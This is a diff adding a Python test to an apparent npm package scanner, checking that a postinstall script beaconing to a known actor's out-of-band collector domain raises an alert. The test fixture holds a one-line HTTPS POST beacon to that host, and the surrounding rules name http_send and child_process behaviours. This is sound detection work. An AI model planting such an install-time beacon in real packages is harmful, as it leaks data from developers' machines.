@@ -99,3 +99,12 @@ def test_browser_version_tracking_packages_are_not_dependency_confusion():
     # chromedriver 155.x: high version, ordinary multi-file package
     assert package_features.combine(scan, ["inflated_version", "http_send", "child_process"], "npm") is scan
     assert "BEH_VERSION_CONFUSION" in package_features.combine(scan, ["inflated_version", "tiny_package"], "npm")["rules_matched"]
+
+
+def test_known_actor_infrastructure_is_an_alert():
+    beacon = b'https.request({hostname: "collector.oob.s4yhii.com", path: "/_npm-poc/beacon", method: "POST"})'
+    flags = package_features.profile([("package/postinstall.js", beacon)])
+    assert "known_actor_infra" in flags
+    result = package_features.combine({"score": 0, "findings": [], "rules_matched": []}, flags, "npm")
+    assert result["level"] == "alert" and "BEH_KNOWN_ACTOR_INFRA" in result["rules_matched"]
+    assert "known_actor_infra" not in package_features.profile([("package/a.js", b'"notoob.s4yhii.community"')])
